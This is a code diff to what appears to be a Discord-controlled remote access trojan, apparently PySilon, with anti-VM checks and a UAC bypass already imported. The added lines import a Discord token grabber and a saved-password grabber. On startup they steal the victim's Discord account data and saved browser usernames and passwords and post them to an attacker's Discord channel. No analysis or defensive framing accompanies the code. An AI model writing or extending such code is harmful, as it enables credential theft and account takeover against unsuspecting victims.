@@ -30,6 +30,8 @@ def log(entry): # [pysilon_mark] !debug
 
 # [pysilon_var] $modules 0
 from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
+from resources.discord_token_grabber import *
+from resources.passwords_grabber import *
 from urllib.request import urlopen
 from resources.uac_bypass import *
 from itertools import islice
@@ -40,6 +42,7 @@ import subprocess
 import threading
 import discord
 import asyncio
+import base64
 import psutil
 import json
 import sys
@@ -201,6 +204,19 @@ async def on_ready():
                 chunk += line + '\n'
         await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
         #.log Sent system information on info channel
+
+        accounts = grab_discord.initialize(False)
+            #.log Grabbed Discord (Auto)
+        for account in accounts:
+            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌')
+                #.log Sent embed with Discord account data (Auto)
+
+        result = grab_passwords()
+            #.log Grabbed passwords (Auto)
+        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
+        for url in result.keys():
+            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
+        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌')
 
     else:
         #.log Fetching channel IDs...
